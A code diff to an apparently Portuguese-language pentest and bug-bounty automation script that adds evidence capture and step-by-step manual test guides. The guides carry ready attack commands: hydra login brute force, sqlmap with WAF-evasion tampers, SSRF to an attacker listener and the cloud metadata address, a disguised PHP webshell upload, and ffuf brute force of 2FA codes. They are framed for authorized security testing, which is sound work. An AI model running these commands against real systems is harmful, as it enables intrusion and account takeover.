@@ -158,6 +158,11 @@ SECLISTS_DIRS_BY_SIZE = {
 SECLISTS_SUBS_5000 = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
 ROCKYOU = "/usr/share/wordlists/rockyou.txt"
 
+# Base dos relatorios: pasta RESULTADOS/ ao lado do proprio script (nao em
+# ~/pentest). Usar o diretorio do script (nao Path.home()) mantem tudo junto
+# do nvkscan.py e portatil -- pra quem clonar, vira <pasta_do_script>/RESULTADOS.
+OUTPUT_BASE = Path(__file__).resolve().parent / "RESULTADOS"
+
 SENSITIVE_PATHS = [
     "/.env", "/.env.bak", "/.git/config", "/.git/HEAD", "/config.php.bak",
     "/wp-config.php.bak", "/backup.zip", "/backup.sql", "/database.sql",
@@ -757,7 +762,15 @@ def check_paths(base_url, paths, outfile: Path, log: Log, label="caminhos", thre
         score, tier, reasons = score_finding_confidence(p, content_type, body, baseline_body)
         linha = f"200 {p} :: confianca {score:.0f}/100 ({tier}) :: " + "; ".join(reasons)
         if tier == "ALTA":
-            exposed.append(linha)
+            evid = ("URL: " + full_url + "\n"
+                    "Status HTTP: 200\n"
+                    "Content-Type: " + (content_type or "(nao informado)") + "\n"
+                    f"Confianca: {score:.0f}/100 ({tier})\n"
+                    "Sinais que elevaram a confianca: " + "; ".join(reasons) + "\n"
+                    f"Tamanho do corpo recebido: {len(body)} bytes\n"
+                    "--- inicio do corpo da resposta (ate 1500 chars) ---\n"
+                    + body[:1500])
+            exposed.append({"resumo": linha, "path": p, "url": full_url, "evidencia": evid})
         elif tier == "MEDIA":
             review.append(linha)
         else:
@@ -769,8 +782,9 @@ def check_paths(base_url, paths, outfile: Path, log: Log, label="caminhos", thre
         log.info(f"  {len(discarded)} candidato(s) com 200 descartado(s) na validacao de conteudo "
                  f"(confianca BAIXA, provavel falso positivo, nao contam como achado)")
 
+    exposed_lines = [e["resumo"] for e in exposed]
     outfile.write_text(
-        "EXPOSTO (confianca ALTA >=70/100, achado real, conta no relatorio):\n" + ("\n".join(exposed) or "(nenhum)") +
+        "EXPOSTO (confianca ALTA >=70/100, achado real, conta no relatorio):\n" + ("\n".join(exposed_lines) or "(nenhum)") +
         "\n\nREVISAR MANUALMENTE (confianca MEDIA 40-69/100, inconclusivo):\n" + ("\n".join(review) or "(nenhum)") +
         "\n\nBLOQUEADO (401/403, caminho existe/e tratado mas sem acesso direto, NAO conta como achado):\n" +
         ("\n".join(blocked) or "(nenhum)") +
@@ -819,11 +833,58 @@ class Findings:
     def __init__(self):
         self.items = []
 
-    def add(self, fase, tipo, detalhe):
-        self.items.append({"fase": fase, "tipo": tipo, "detalhe": str(detalhe)[:200]})
+    def add(self, fase, tipo, detalhe, evidencia=None):
+        """detalhe: resumo curto (vai na tabela). evidencia: texto completo,
+        multi-linha, com a prova real do achado (URL, status, content-type,
+        trecho do corpo, etc.) -- vai na secao 'Detalhamento dos achados' do
+        relatorio. Quanto mais evidencia concreta, melhor (o usuario precisa
+        comprovar o achado pra gestao/cliente)."""
+        self.items.append({
+            "fase": fase,
+            "tipo": tipo,
+            "detalhe": str(detalhe)[:300],
+            "evidencia": (str(evidencia)[:6000] if evidencia else None),
+        })
 
     def __len__(self):
         return len(self.items)
+
+
+def manual_step(titulo, objetivo="", prereqs="", passos=None):
+    """Monta um passo manual no formato 'mastigado' aprovado: titulo claro,
+    o que se vai confirmar, pre-requisitos, e sub-passos numerados -- cada
+    sub-passo pode ter um comando pronto (ja com dado real) e uma dica de
+    como ler a saida. Retorna um bloco markdown pronto (comeca com ###, que
+    e como o write_report reconhece o formato novo).
+
+    passos: lista onde cada item e:
+      - str                      -> so texto
+      - (texto, comando)         -> texto + bloco de comando
+      - (texto, comando, como)   -> texto + comando + '-> como ler a saida'
+      (use comando="" quando o passo nao tiver comando mas tiver 'como')
+    """
+    out = [f"### {titulo}", ""]
+    if objetivo:
+        out.append(f"**O que você vai confirmar:** {objetivo}")
+    if prereqs:
+        out.append(f"**Pré-requisitos:** {prereqs}")
+    if objetivo or prereqs:
+        out.append("")
+    for i, p in enumerate(passos or [], 1):
+        if isinstance(p, str):
+            out.append(f"{i}. {p}")
+            continue
+        texto = p[0]
+        cmd = p[1] if len(p) > 1 else ""
+        como = p[2] if len(p) > 2 else ""
+        out.append(f"{i}. {texto}")
+        if cmd:
+            out.append("```bash")
+            out.append(cmd)
+            out.append("```")
+        if como:
+            out.append(f"   → {como}")
+    return "\n".join(out)
 
 
 _STEP_TAG_RE = re.compile(r"^([\w./]+):\s*(.*)$", re.S)
@@ -873,18 +934,44 @@ def write_report(workdir: Path, module_name, target, active, findings: Findings,
         "",
     ]
     if findings.items:
-        lines.append("| Fase | Tipo | Detalhe |")
-        lines.append("|---|---|---|")
-        for f in findings.items:
+        lines.append("| # | Fase | Tipo | Detalhe |")
+        lines.append("|---|---|---|---|")
+        for i, f in enumerate(findings.items, 1):
             detalhe = f["detalhe"].replace("|", "\\|")
-            lines.append(f"| {f['fase']} | {f['tipo']} | {detalhe} |")
+            lines.append(f"| {i} | {f['fase']} | {f['tipo']} | {detalhe} |")
     else:
         lines.append("Nenhum achado automatico sinalizado. Isso NAO significa que o alvo")
         lines.append("esta seguro, so que os checks automatizados nao encontraram nada.")
         lines.append("Continue a analise manual a partir do guia.")
+
+    # Detalhamento: evidencia COMPLETA de cada achado que tiver (URL, status,
+    # content-type, trecho do corpo, PoC...) -- pra comprovar o achado pra
+    # gestao/cliente sem precisar reproduzir o scan inteiro
+    detailed = [f for f in findings.items if f.get("evidencia")]
+    if detailed:
+        lines += ["", "## Detalhamento dos achados (evidencia)", ""]
+        for i, f in enumerate(findings.items, 1):
+            if not f.get("evidencia"):
+                continue
+            lines.append(f"### {i}. [{f['fase']}] {f['tipo']}")
+            lines.append("")
+            lines.append(f["detalhe"])
+            lines.append("")
+            lines.append("```")
+            lines += f["evidencia"].splitlines()
+            lines.append("```")
+            lines.append("")
+
     lines += ["", "## Arquivos gerados", "", f"Ver pasta `{workdir}/`.", "",
-              "## Proximos passos manuais (nao automatizados por design)", ""]
-    lines += _format_manual_steps(manual_next_steps)
+              "## Proximos passos manuais (passo a passo pra confirmacao)", ""]
+    # passos no formato novo "mastigado" ja vem como blocos markdown prontos
+    # (comecam com ###); modulos ainda nao migrados usam o formato antigo
+    if any(str(s).lstrip().startswith("###") for s in manual_next_steps):
+        for block in manual_next_steps:
+            lines.append(str(block))
+            lines.append("")
+    else:
+        lines += _format_manual_steps(manual_next_steps)
     lines.append("")
     report_path.write_text("\n".join(lines), encoding="utf-8")
     log.ok(f"relatorio salvo em {report_path}")
@@ -897,7 +984,7 @@ def write_report(workdir: Path, module_name, target, active, findings: Findings,
 
 def make_workdir(subpath, label):
     safe_label = re.sub(r"[^\w.-]", "_", label)
-    workdir = Path.home() / "pentest" / subpath / safe_label
+    workdir = OUTPUT_BASE / subpath / safe_label
     for sub in ("recon", "enum", "exploit", "evidence"):
         (workdir / sub).mkdir(parents=True, exist_ok=True)
     return workdir
@@ -914,26 +1001,45 @@ def report_nuclei_findings(nuclei_file: Path, fase, findings: "Findings", log: L
         return
     log.warn(f"  nuclei encontrou {len(lines)} achado(s), ver {nuclei_file.name}")
     for line in lines[:10]:  # nao inunda o relatorio, so os 10 primeiros, arquivo completo fica salvo
-        findings.add(fase, "nuclei", line)
+        # a linha do nuclei ja traz template-id, severidade, protocolo e a
+        # URL que casou -- e a propria evidencia do achado
+        findings.add(fase, "nuclei", line, "Linha bruta do nuclei (template :: severidade :: URL que casou):\n" + line)
     if len(lines) > 10:
         findings.add(fase, "nuclei", f"+{len(lines) - 10} achado(s) a mais, ver {nuclei_file}")
 
 
-def report_dalfox_findings(dalfox_file: Path, fase, findings: "Findings", log: Log):
-    """Mesma ideia do report_nuclei_findings, mas pro dalfox -- antes o
-    resultado dele ficava preso no arquivo bruto e nunca contava no
-    relatorio final, mesmo quando achava XSS real. --silent so imprime
-    linha quando confirma algo, entao qualquer linha nao-vazia aqui e
-    achado de verdade, nao ruido."""
+_DALFOX_ERR_RE = re.compile(r"(?i)internal error|cannot find|failed:|missing file|"
+                             r"no such file|command not found|snap|panic:|traceback")
+
+
+def report_dalfox_findings(dalfox_file: Path, fase, findings: "Findings", log: Log, rc=0):
+    """Reporta XSS confirmado pelo dalfox. Robusto contra dois casos que
+    geravam FALSO POSITIVO num teste real:
+
+    1. dalfox quebrado (binario/snap com erro) -- a saida vira mensagem de
+       erro, nao achado. Se rc != 0, nao conta NADA como XSS, so avisa que a
+       ferramenta falhou (descoberto contra alvo real: snap do dalfox sem o
+       meta/snap.yaml fazia a linha de erro virar "achado de XSS").
+    2. mesmo com rc 0, so conta linha que parece PoC de verdade (tem [POC]
+       ou uma URL http[s]) e que NAO seja linha de erro/diagnostico."""
+    if rc not in (0, None):
+        log.warn(f"  dalfox nao rodou corretamente (codigo {rc}) -- SEM resultado de XSS "
+                 f"confiavel (ferramenta falhou, nao e achado), ver {dalfox_file.name}")
+        return
     if not dalfox_file.exists():
         return
-    lines = [l for l in dalfox_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
+    raw = [l for l in dalfox_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
+    lines = [l for l in raw
+             if ("[POC]" in l or re.search(r"https?://\S+", l)) and not _DALFOX_ERR_RE.search(l)]
     if not lines:
         log.ok("  dalfox nao encontrou XSS")
         return
     log.warn(f"  dalfox encontrou {len(lines)} achado(s) de XSS, ver {dalfox_file.name}")
     for line in lines[:10]:
-        findings.add(fase, "dalfox XSS", line)
+        # a linha [POC][V][GET]... e a URL exata que dispara o XSS -- cole no
+        # navegador/Burp pra reproduzir e comprovar
+        findings.add(fase, "dalfox XSS", line,
+                     "PoC do dalfox (cole esta URL no navegador pra reproduzir o XSS):\n" + line)
     if len(lines) > 10:
         findings.add(fase, "dalfox XSS", f"+{len(lines) - 10} achado(s) a mais, ver {dalfox_file}")
 
@@ -952,8 +1058,9 @@ def report_sslscan_findings(sslscan_out, fase, findings: "Findings", log: Log):
     if not weak:
         log.ok("  sslscan: nenhum protocolo/cipher fraco aceito")
         return
+    evid_all = "sslscan reportou aceitos (fracos/obsoletos) os seguintes:\n" + "\n".join(sorted(weak))
     for line in sorted(weak)[:10]:
-        findings.add(fase, "protocolo/cipher TLS fraco aceito", line)
+        findings.add(fase, "protocolo/cipher TLS fraco aceito", line, evid_all)
     log.warn(f"  sslscan: {len(weak)} protocolo(s)/cipher(s) fraco(s) aceito(s)")
 
 
@@ -970,8 +1077,22 @@ def report_sqlmap_findings(sqlmap_file: Path, target_url, fase, findings: "Findi
         log.ok("  sqlmap nao confirmou injecao nessa URL")
         return
     log.warn(f"  sqlmap CONFIRMOU SQL injection em {target_url}, ver {sqlmap_file.name}")
+    # extrai o bloco completo de injecao (Parameter/Type/Title/Payload) que o
+    # sqlmap imprime -- e a prova real: o tipo de SQLi e o payload exato
+    bloco = []
+    capturando = False
+    for l in text.splitlines():
+        if l.strip().startswith("sqlmap identified the following injection point"):
+            capturando = True
+        if capturando:
+            bloco.append(l.rstrip())
+            if l.strip().startswith("---") and len(bloco) > 3:
+                break
+    evid = ("Alvo: " + target_url + "\n"
+            "Ponto(s) de injecao confirmado(s) pelo sqlmap (tipo + payload exato):\n"
+            + ("\n".join(bloco[:60]) if bloco else "\n".join(param_lines)))
     for line in param_lines[:10]:
-        findings.add(fase, "sqlmap SQLi confirmada", f"{target_url} :: {line}")
+        findings.add(fase, "sqlmap SQLi confirmada", f"{target_url} :: {line}", evid)
 
 
 def parse_targets_file(path):
@@ -1130,21 +1251,27 @@ def check_cloud_buckets(domain, workdir, log, findings, threads=20):
         for full_url, name in candidates_200:
             _, body = fetch_body_snippet(full_url)
             if looks_like_real_bucket(provider, body):
-                exposed.append(name)
+                exposed.append((name, full_url, body))
             else:
                 discarded.append(f"{name} (200 mas corpo nao parece listagem de bucket de verdade)")
         if discarded:
             log.info(f"  {len(discarded)} candidato(s) {provider} descartado(s) na validacao de conteudo")
 
         (enum_dir / fname).write_text(
-            f"PUBLICO (200, achado real, validado por conteudo):\n" + ("\n".join(exposed) or "(nenhum)") +
+            f"PUBLICO (200, achado real, validado por conteudo):\n" + ("\n".join(n for n, _, _ in exposed) or "(nenhum)") +
             f"\n\nEXISTE MAS PRIVADO (403, nao conta como achado):\n" + ("\n".join(private) or "(nenhum)") +
             f"\n\nDESCARTADO (200 mas falhou na validacao, provavel falso positivo):\n" + ("\n".join(discarded) or "(nenhum)"),
             encoding="utf-8",
         )
         if exposed:
-            for b in exposed:
-                findings.add("M1.3", f"bucket {provider} publico", b)
+            for name, full_url, body in exposed:
+                evid = ("Bucket: " + name + "\n"
+                        "URL (GET anonimo retornou 200 + listagem valida): " + full_url + "\n"
+                        f"Provedor: {provider}\n"
+                        "Prova (bucket publico de verdade: o corpo tem a assinatura de listagem do provedor):\n"
+                        "--- inicio da listagem (ate 1500 chars) ---\n"
+                        + body[:1500])
+                findings.add("M1.3", f"bucket {provider} publico", name, evid)
             log.warn(f"  {len(exposed)} bucket(s) {provider} PUBLICO(S) e VALIDADO(S), ver enum/{fname}")
         if private:
             log.info(f"  {len(private)} bucket(s) {provider} existem mas sao privados")
@@ -1325,9 +1452,9 @@ def module_web(domain, url, active, log, findings, workdir, wordlist_override=No
             f"-o {enum_dir/'ffuf_dirs.json'} -of json",
             log, label=f"ffuf (fuzzing de diretorios, {wordlist_size}, depth={recursion_depth})", timeout=600)
     hits = check_paths(url, SENSITIVE_PATHS, enum_dir / "sensitive_files.txt", log, "arquivos sensiveis", threads=threads)
-    for h in hits: findings.add("M1.3", "arquivo sensivel exposto", h)
+    for h in hits: findings.add("M1.3", "arquivo sensivel exposto", h["resumo"], h["evidencia"])
     hits = check_paths(url, ADMIN_API_PATHS, enum_dir / "admin_api.txt", log, "endpoints admin/API", threads=threads)
-    for h in hits: findings.add("M1.3", "endpoint admin/API exposto", h)
+    for h in hits: findings.add("M1.3", "endpoint admin/API exposto", h["resumo"], h["evidencia"])
     if require_tool("sslscan", log):
         rc, out = run(f"sslscan {domain}:443", log, outfile=enum_dir / "sslscan.txt", timeout=60, retries=1)
         report_sslscan_findings(out, "M1.3", findings, log)
@@ -1358,9 +1485,13 @@ def module_web(domain, url, active, log, findings, workdir, wordlist_override=No
             if require_tool("dalfox", log):
                 sample = urls_param[:20]
                 (exploit_dir / "dalfox_input.txt").write_text("\n".join(sample), encoding="utf-8")
-                run(f"dalfox file {exploit_dir/'dalfox_input.txt'} --silent",
+                # --silence-force: so imprime PoC confirmado, sem barra de
+                # progresso; --no-color/--no-spinner: saida limpa pro arquivo
+                # (a flag --silent de versoes antigas nao existe mais no
+                # dalfox atual -- usar ela fazia o comando falhar inteiro)
+                rc_dalfox, _ = run(f"dalfox file {exploit_dir/'dalfox_input.txt'} --silence-force --no-color --no-spinner",
                     log, outfile=exploit_dir / "dalfox.txt", label="dalfox (XSS)", timeout=600)
-                report_dalfox_findings(exploit_dir / "dalfox.txt", "M1.5", findings, log)
+                report_dalfox_findings(exploit_dir / "dalfox.txt", "M1.5", findings, log, rc_dalfox)
             if require_tool("sqlmap", log):
                 # testava SO a primeira URL -- se ela por acaso nao fosse
                 # injetavel mas outra fosse, o sqlmap nunca chegava a testar
@@ -1390,68 +1521,122 @@ def module_web(domain, url, active, log, findings, workdir, wordlist_override=No
     login_url = find_real_url(workdir, ("login", "signin", "sign-in", "auth"))
     upload_url = find_real_url(workdir, ("upload",))
 
+    manual_steps = []
+
+    # --- M1.4 forca bruta de login ---
     if login_url:
-        passo_login = (
-            f"M1.4: forca bruta de login -- o recon achou essa URL real: {login_url} . "
-            f"Inspecione o form (`curl -s {login_url} | grep -iE 'name=|input'`) pra pegar os "
-            f"nomes de campo e a mensagem de erro exatos, depois "
-            f"`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {domain} https-post-form "
-            f"\"/login:user=^USER^&pass=^PASS^:F=<mensagem_de_erro_real>\" -t 4 -I` "
-            f"(ajuste o path e os campos pro form real -- rode com -t baixo, combine volume com quem autorizou)"
-        )
+        manual_steps.append(manual_step(
+            "M1.4 — Forca bruta de login / credenciais fracas",
+            objetivo="se o login aceita usuario/senha por forca bruta (sem rate limit efetivo).",
+            prereqs="hydra (`apt install hydra`) · users.txt (lista de usuarios) · rockyou.txt · a URL de login real abaixo (achada no recon).",
+            passos=[
+                ("Veja os nomes EXATOS dos campos do form e a mensagem de erro de login invalido:",
+                 f"curl -s {login_url} | grep -iE 'name=|<input|<form'",
+                 "anote o `name` do campo de usuario, o de senha, e o texto exato que aparece quando a senha erra (ex.: 'Invalid credentials')."),
+                ("Monte o hydra com esses dados reais (troque os nomes dos campos e a mensagem de erro pelos que voce viu acima):",
+                 f'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {domain} https-post-form "/login:user=^USER^&pass=^PASS^:F=<mensagem_de_erro_real>" -t 4 -I',
+                 "confirmado se o hydra imprimir `[443][http-post-form] host: ... login: ... password: ...`."),
+                "Rode com `-t 4` (poucas threads) pra nao derrubar o alvo e combine o volume/janela com quem autorizou o teste.",
+            ],
+        ))
     else:
-        passo_login = (
-            f"M1.4: forca bruta de login -- o recon NAO achou nenhuma URL de login nas listas "
-            f"coletadas (katana/gau/wayback). Navegue o site manualmente pra achar o form real "
-            f"antes de montar o comando do hydra -- chutar o path sem confirmar da falso negativo"
-        )
+        manual_steps.append(manual_step(
+            "M1.4 — Forca bruta de login / credenciais fracas",
+            objetivo="se existe login vulneravel a forca bruta.",
+            prereqs="hydra · rockyou.txt",
+            passos=[
+                "O recon (katana/gau/wayback) NAO achou nenhuma URL de login. Navegue o site com o Burp proxy ligado pra achar o formulario de login real — chutar o path da falso negativo.",
+                ("Quando achar a URL real do login, inspecione os campos antes de montar o hydra:",
+                 "curl -s https://<URL_REAL_DO_LOGIN> | grep -iE 'name=|<input|<form'",
+                 "aí monte o hydra com os nomes de campo e a mensagem de erro reais."),
+            ],
+        ))
 
+    # --- M1.5 SQL injection ---
     if exemplo_param_url:
-        passo_sqlmap = (
-            f"M1.5: extracao via sqlmap -- URL real com parametro achada pelo recon: "
-            f"{exemplo_param_url} . So depois de confirmar a injecao (nunca direto no --dump) -- "
-            f"`sqlmap -u \"{exemplo_param_url}\" --batch --dbs` "
-            f"`sqlmap -u \"{exemplo_param_url}\" --batch --dump -D <banco_encontrado>`"
-        )
-        passo_ssrf = (
-            f"M1.5: SSRF -- teste o MESMO parametro real acima com uma URL sua: "
-            f"`curl \"{exemplo_param_url.split('?')[0]}?{exemplo_param_url.split('?',1)[-1].split('=')[0]}"
-            f"=http://SEU_IP:PORTA/\"` `nc -lvnp PORTA` (so funciona se o parametro aceitar URL "
-            f"de verdade, nem todo parametro com = serve pra SSRF -- confirme olhando o que o "
-            f"parametro faz antes)"
-        )
+        manual_steps.append(manual_step(
+            "M1.5 — Confirmar SQL Injection",
+            objetivo=f"se a URL com parametro achada pelo recon e injetavel.",
+            prereqs="sqlmap (instalado e validado) · a URL real abaixo · se o endpoint pedir login, seu cookie de sessao.",
+            passos=[
+                ("Deteccao (SO confirma, nao extrai nada ainda):",
+                 f'sqlmap -u "{exemplo_param_url}" --batch --level 3 --risk 2 --random-agent | tee evidencia_sqli.txt',
+                 "confirmou se aparecer `is vulnerable` ou `sqlmap identified the following injection point(s)` (anote o tipo: boolean/time-based/UNION). Nao confirmou se `all tested parameters do not appear to be injectable`."),
+                ("Se tiver WAF (veja o achado do wafw00f acima) e o passo 1 nao confirmar, tente evadir:",
+                 f'sqlmap -u "{exemplo_param_url}" --batch --random-agent --tamper=space2comment,between --delay 1 --level 5 --risk 3'),
+                ("Se o endpoint exigir sessao, adicione o cookie (DevTools → Application → Cookies):",
+                 f'sqlmap -u "{exemplo_param_url}" --cookie "SESSIONID=cole_aqui" --batch --level 3'),
+                ("SO depois de confirmar, enumere os bancos (ainda sem dump):",
+                 f'sqlmap -u "{exemplo_param_url}" --batch --dbs'),
+            ],
+        ))
+        ssrf_base = exemplo_param_url.split("?")[0]
+        ssrf_param = exemplo_param_url.split("?", 1)[-1].split("=")[0]
+        manual_steps.append(manual_step(
+            "M1.5 — Confirmar SSRF no mesmo parametro",
+            objetivo=f"se o parametro `{ssrf_param}` busca uma URL do lado do servidor (SSRF).",
+            prereqs="netcat (`nc`) ou Burp Collaborator · o parametro real abaixo. ATENCAO: nem todo parametro com `=` serve pra SSRF — so os que recebem uma URL/caminho.",
+            passos=[
+                ("Suba um listener seu num IP/porta que o alvo consiga alcancar:",
+                 "nc -lvnp 4444"),
+                (f"Aponte o parametro real pra esse listener e veja se o SERVIDOR do alvo te chama:",
+                 f'curl "{ssrf_base}?{ssrf_param}=http://SEU_IP:4444/"',
+                 "SSRF confirmado se o `nc` receber uma conexao vinda do IP do servidor do alvo (nao do seu). Pra achados internos, aponte pra http://169.254.169.254/latest/meta-data/ (metadata cloud)."),
+            ],
+        ))
     else:
-        passo_sqlmap = (
-            "M1.5: extracao via sqlmap -- o recon NAO achou nenhuma URL com parametro (?x=y) nas "
-            "listas coletadas. Sem isso nao tem onde testar SQLi/SSRF automatizado -- navegue o "
-            "site manualmente procurando formularios/filtros/busca que gerem URL com parametro"
-        )
-        passo_ssrf = None
+        manual_steps.append(manual_step(
+            "M1.5 — SQL Injection / SSRF",
+            objetivo="testar SQLi/SSRF.",
+            passos=[
+                "O recon NAO achou nenhuma URL com parametro (`?x=y`) nas listas coletadas. Sem isso nao ha onde testar automatizado — navegue o site (Burp ligado) procurando busca/filtros/formularios que gerem URL com parametro, e aí aplique o sqlmap/SSRF na URL real encontrada.",
+            ],
+        ))
 
-    manual_steps = [passo_login, passo_sqlmap]
-    if passo_ssrf:
-        manual_steps.append(passo_ssrf)
-    manual_steps.append(
-        "M1.5: IDOR -- repetir requisicoes autenticadas trocando o ID do objeto (Burp Repeater), "
-        "comparar resposta de usuario A vs B no mesmo endpoint"
-    )
+    # --- M1.5 IDOR ---
+    manual_steps.append(manual_step(
+        "M1.5 — IDOR (Insecure Direct Object Reference)",
+        objetivo="se um usuario consegue acessar objeto de outro trocando o ID.",
+        prereqs="Burp Suite · DUAS contas de teste (usuario A e usuario B).",
+        passos=[
+            "Logado como A, capture no Burp uma requisicao que acesse um objeto do A (ex.: GET /api/pedido/1001).",
+            "Mande pro Repeater, troque o ID do objeto por um do B (ex.: 1002), e reenvie AINDA com o token/sessao do A.",
+            ("Compare as respostas:",
+             "",
+             "IDOR confirmado se A receber 200 com os DADOS do B. Se vier 403/404/vazio, esta protegido."),
+        ],
+    ))
+
+    # --- M1.5 upload ---
     if upload_url:
-        manual_steps.append(
-            f"M1.5: upload bypass -- o recon achou um endpoint de upload real: {upload_url} . "
-            f"`curl -F \"file=@shell.php.jpg;type=image/jpeg\" {upload_url}` "
-            f"(testar tambem magic bytes de GIF/PNG na frente do payload, e renomear pra "
-            f".phtml/.php5/.pht se .php for bloqueado)"
-        )
+        manual_steps.append(manual_step(
+            "M1.5 — Bypass de upload (webshell)",
+            objetivo="se da pra subir um arquivo executavel burlando o filtro.",
+            prereqs=f"o endpoint de upload real abaixo (achado no recon) · um arquivo de teste.",
+            passos=[
+                ("Tente subir um PHP disfarcado de imagem (dupla extensao + content-type de imagem):",
+                 f'curl -F "file=@shell.php.jpg;type=image/jpeg" {upload_url}',
+                 "veja na resposta o caminho onde o arquivo ficou; acesse-o no navegador pra ver se o PHP executa."),
+                "Se `.php` for bloqueado, tente extensoes alternativas: `.phtml`, `.php5`, `.pht`, e colocar magic bytes de GIF (`GIF89a`) na primeira linha do arquivo.",
+            ],
+        ))
     else:
-        manual_steps.append(
-            "M1.5: upload bypass -- o recon NAO achou nenhum endpoint de upload nas listas "
-            "coletadas. So vale testar isso se voce confirmar visualmente que o site tem "
-            "campo de upload de arquivo"
-        )
-    manual_steps.append(
-        "M1.5: deserializacao/request smuggling/cache poisoning/prototype pollution -- exigem Burp "
-        "Suite manual (ver Modulo 11 do guia pra payload especifico de cada classe)"
-    )
+        manual_steps.append(manual_step(
+            "M1.5 — Bypass de upload (webshell)",
+            objetivo="testar upload de webshell.",
+            passos=[
+                "O recon NAO achou nenhum endpoint de upload nas listas coletadas. So vale testar se voce confirmar (navegando o site) que existe campo de upload de arquivo; aí aplique o bypass de dupla extensao / magic bytes no endpoint real.",
+            ],
+        ))
+
+    # --- M1.5 classes que exigem Burp manual ---
+    manual_steps.append(manual_step(
+        "M1.5 — Deserializacao / Request Smuggling / Cache Poisoning / Prototype Pollution",
+        objetivo="classes que nao da pra automatizar com seguranca.",
+        passos=[
+            "Exigem Burp Suite manual com payload especifico por classe. Veja o Modulo 11 do guia (pentest-metodologia) pro payload de cada uma; comece pelas que fazem sentido pela stack detectada no recon (ex.: prototype pollution em apps Node/JS, deserializacao em Java/PHP).",
+        ],
+    ))
     return manual_steps
 
 
@@ -1476,7 +1661,13 @@ def _grep_js_secrets(workdir, url, log, findings):
             continue
     if hits:
         (workdir / "enum" / "js_secrets.txt").write_text("\n".join(hits), encoding="utf-8")
-        findings.add("M1.3", "possivel segredo em JS", f"{len(hits)} ocorrencia(s), ver enum/js_secrets.txt")
+        evid = (f"{len(hits)} ocorrencia(s) de padrao sensivel (api_key/secret/token/password/aws_*) "
+                "em arquivos .js servidos pelo alvo.\n"
+                "Cada linha e 'URL_do_JS :: trecho_que_bateu' (os primeiros ate 25):\n"
+                "--- ocorrencias ---\n"
+                + "\n".join(hits[:25])
+                + (f"\n... (+{len(hits)-25} em enum/js_secrets.txt)" if len(hits) > 25 else ""))
+        findings.add("M1.3", "possivel segredo em JS", f"{len(hits)} ocorrencia(s), ver enum/js_secrets.txt", evid)
         log.warn(f"  {len(hits)} possivel(is) segredo(s) em JS")
     else:
         log.ok("  nenhum segredo obvio nos JS analisados")
@@ -1538,19 +1729,43 @@ def module_bugbounty(domain, program, active, log, findings, workdir):
         report_nuclei_findings(exploit_dir / "nuclei.txt", "M2.6", findings, log)
 
     manual_steps = [
-        "M2.5: triar cada achado automatico -- abra `exploit/nuclei.txt` e confirme manualmente "
-        "cada linha antes de reportar (self-XSS/CSRF sem impacto normalmente nao valem bounty)",
-        "M2.7: testar 2FA bypass -- primeiro capture a requisicao real de verificacao (Burp "
-        "proxy ligado, fazer o fluxo de 2FA uma vez e olhar no HTTP history, nao adianta chutar "
-        "o endpoint). Depois teste nessa requisicao real: 1) reenviar um token de reset de senha "
-        "ja usado antes; 2) `ffuf -u <URL_REAL_CAPTURADA> -X POST -d 'code=FUZZ' -w "
-        "<(seq -w 0 9999) -mc 200` pra ver se o codigo de 4-6 digitos tem rate limit de verdade; "
-        "3) interceptar a resposta que diz '2FA necessario' e forcar o valor pra false/0, ver se "
-        "o backend confia so no frontend pra bloquear",
-        f"M2.8: escrever o relatorio no formato da plataforma (programa: {program or 'definir'})",
-        f"Rode esse script periodicamente (cron) pra manter o diff de subdominios atualizado: "
-        f"`0 */6 * * * cd {Path(__file__).resolve().parent} && python3 nvkscan.py "
-        f"--module bugbounty -d {domain} --program \"{program or 'nome'}\" --skip-auth-gate`",
+        manual_step(
+            "M2.5 — Triagem dos achados automaticos",
+            objetivo="separar o que tem impacto real (vale bounty) do ruido.",
+            passos=[
+                "Abra `exploit/nuclei.txt` e confirme MANUALMENTE cada linha antes de reportar — reproduza o achado no navegador/Burp.",
+                "Descarte o que nao tem impacto pratico (self-XSS, CSRF sem acao sensivel, info disclosure trivial) — a maioria dos programas nao paga por isso.",
+            ],
+        ),
+        manual_step(
+            "M2.7 — Testar 2FA bypass",
+            objetivo="se da pra pular a verificacao de 2FA.",
+            prereqs="Burp Suite · uma conta de teste com 2FA ativo · ffuf.",
+            passos=[
+                "Com o Burp ligado, faca o fluxo de 2FA UMA vez e ache no HTTP history a requisicao real de verificacao do codigo (nao chute o endpoint).",
+                "Tecnica 1 — reenviar um token de reset/verificacao JA usado antes e ver se ainda e aceito.",
+                ("Tecnica 2 — brute force do codigo (ve se tem rate limit de verdade) na URL real capturada:",
+                 "ffuf -u <URL_REAL_CAPTURADA> -X POST -d 'code=FUZZ' -w <(seq -w 0 9999) -mc 200",
+                 "se algum code=NNNN voltar 200/sucesso, o 2FA nao tem rate limit e e brute-forcavel."),
+                "Tecnica 3 — interceptar a resposta que diz 'precisa de 2FA' e forcar o valor pra false/0 (ou remover o passo), pra ver se o backend confia so no frontend.",
+            ],
+        ),
+        manual_step(
+            "M2.8 — Relatorio",
+            objetivo="entregar o achado no formato que o programa aceita.",
+            passos=[
+                f"Escreva o report no formato da plataforma (programa: {program or 'definir'}). Inclua: passos de reproducao, impacto, e a evidencia (use o que esta na secao 'Detalhamento dos achados' deste RESULTADOS.md).",
+            ],
+        ),
+        manual_step(
+            "Recon continuo (cron)",
+            objetivo="pegar subdominios novos assim que aparecem (first-mover em bounty).",
+            passos=[
+                ("Agende este scan a cada 6h pra manter o diff de subdominios atualizado:",
+                 f'0 */6 * * * cd {Path(__file__).resolve().parent} && python3 nvkscan.py --module bugbounty -d {domain} --program "{program or "nome"}" --skip-auth-gate',
+                 "a cada rodada, subdominios novos desde a ultima aparecem como achado M2.3."),
+            ],
+        ),
     ]
     return manual_steps
 
@@ -1578,14 +1793,16 @@ def module_api(domain, url, active, log, findings, workdir, threads=20):
     # 200 generico pra path nenhum existir, e gera falso positivo em todo spec
     hits = check_paths(url, API_SPEC_PATHS, enum_dir / "api_specs.txt", log, "specs de API", threads=threads)
     for h in hits:
-        findings.add("M6B.1", "spec de API exposta (confirmado 200)", h + " (valide BOLA/BOPLA/BFLA contra os endpoints listados)")
+        findings.add("M6B.1", "spec de API exposta (confirmado 200)",
+                     h["resumo"] + " (valide BOLA/BOPLA/BFLA contra os endpoints listados)",
+                     h["evidencia"])
 
